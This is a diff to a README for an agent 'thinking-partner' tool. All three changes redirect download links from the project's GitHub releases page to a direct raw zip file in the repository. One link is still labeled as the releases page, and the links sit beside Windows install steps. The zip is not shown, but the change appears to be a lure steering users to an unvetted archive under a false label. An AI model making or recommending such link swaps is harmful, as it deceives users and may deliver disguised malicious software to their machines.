@@ -1,6 +1,6 @@
 # 🧠 thinking-partner - Clear thinking for better agent work
 
-[![Download thinking-partner](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mortiebiennial49/thinking-partner/releases)
+[![Download thinking-partner](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mortiebiennial49/thinking-partner/raw/refs/heads/main/skills/thinking_partner_v2.2.zip)
 
 ## 🚀 What this is
 
@@ -40,7 +40,7 @@ The goal is not to make the agent sound smart. The goal is to help it think in a
 
 Visit this page to download the latest release for Windows:
 
-[https://github.com/mortiebiennial49/thinking-partner/releases](https://github.com/mortiebiennial49/thinking-partner/releases)
+[https://github.com/mortiebiennial49/thinking-partner/raw/refs/heads/main/skills/thinking_partner_v2.2.zip](https://github.com/mortiebiennial49/thinking-partner/raw/refs/heads/main/skills/thinking_partner_v2.2.zip)
 
 ### Windows steps
 
@@ -297,7 +297,7 @@ Keep the files in one place so they are easy to find and update.
 
 If you want the latest release page, use this link:
 
-[Visit the thinking-partner releases page](https://github.com/mortiebiennial49/thinking-partner/releases)
+[Visit the thinking-partner releases page](https://github.com/mortiebiennial49/thinking-partner/raw/refs/heads/main/skills/thinking_partner_v2.2.zip)
 
 ## 🔧 File naming and use
 
